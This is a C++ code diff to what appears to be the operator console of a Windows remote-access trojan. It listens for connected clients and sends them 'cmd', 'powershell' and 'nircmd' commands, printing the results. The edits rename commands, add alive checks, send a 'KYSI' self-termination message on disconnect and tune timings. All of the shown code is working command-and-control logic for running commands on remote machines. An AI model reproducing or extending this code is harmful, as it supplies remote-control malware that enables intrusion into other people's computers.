@@ -8,7 +8,6 @@ SOCKET listening_socket;
 WSADATA wsData;
 WORD ver = MAKEWORD(2, 2);
 sockaddr_in hint;
-
 string hostname;
 string default_prefix = "root@localhost";
 string prefix = default_prefix;
@@ -34,7 +33,7 @@ Connection find_struct(vector<Connection> m, string unq_nam);
 Connection find_struct(vector<Connection> m, int sc_num);
 Connection find_by_ip(vector<Connection> s, string ip);
 int find_by_num(vector<Connection> ms, int num);
-bool verbose = true;
+bool verbose = false;
 bool check_error(int status);
 void connection_handler(fd_set &connection_master, int port, SOCKET &listening);
 void commandline();
@@ -84,7 +83,7 @@ map<string, function<void(paramType)>> function_connected = {
 	{"detach", [](paramType x) {detach(); }},
 	{"tsend", [](paramType x) {send_message(x); }},
 	{"cmd",[](paramType x) {execute_cmd(x); }},
-	{"ps", [](paramType x) {execute_ps(x); }},
+	{"powershell", [](paramType x) {execute_ps(x); }},
 	{"nircmd", [](paramType x) {execute_nir(x); }},
 	{"start", [](paramType x) {start(x); }}
 };
@@ -193,7 +192,7 @@ void execute_cmd(string command) {
 		if (!(data == "\n" || data == "\r")) {
 			cout << data;
 		}
-		Sleep(10);
+		Sleep(100);
 	}
 	cout << endl;
 	HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -210,7 +209,7 @@ void execute_ps(string command)
 	while (type != "POSE") {
 		recv_data(type, data);
 		if (!(data == "\n" || data == "\r")) {
-			cout << data;
+			cout << data <<"| " <<type;
 		}
 		Sleep(100);
 	}
@@ -293,6 +292,7 @@ void disconnect(string command) {
 		if (!m_connect.empty()) {
 			subject = m_connect.back();
 			if (is_connection(subject)) {
+				send_msg(" ", "KYSI");
 				closesocket(subject.active_socket);
 				m_connect.erase(m_connect.begin() + find_by_num(m_connect, subject.socket_number));
 				if (verbose) {
@@ -519,10 +519,7 @@ bool is_connection(Connection c) {
 	return (c.ip != "" && c.socket_number != NULL && c.unique_name != "");
 }
 
-void commandline() {
-	string input, parameter, function;
-	cout << prefix << " ~ $ ";
-	getline(cin, input);
+void check() {
 	for (auto i : m_connect) {
 		active = i;
 		send_msg("ALIVE", "ALIV");
@@ -532,6 +529,14 @@ void commandline() {
 			disconnect(active.unique_name);
 		}
 	}
+}
+
+void commandline() {
+	string input, parameter, function;
+	cout << prefix << " ~ $ ";
+	getline(cin, input);
+	check();
+	check();
 	if (input.empty()) {
 		clear_count++;
 		if (clear_count >= auto_clear_thrs) {
@@ -649,6 +654,7 @@ void start(string type) {
 	else if (type == "nircmd") {
 		while (true) {
 			string input;
+			cout << "nircmd>";
 			getline(cin, input);
 			if (input == "exit") {
 				return;
@@ -708,6 +714,7 @@ void start(string type) {
 			else if (type_l == "POSE") {
 				break;
 			}
+			Sleep(100);
 		}
 	}
 }
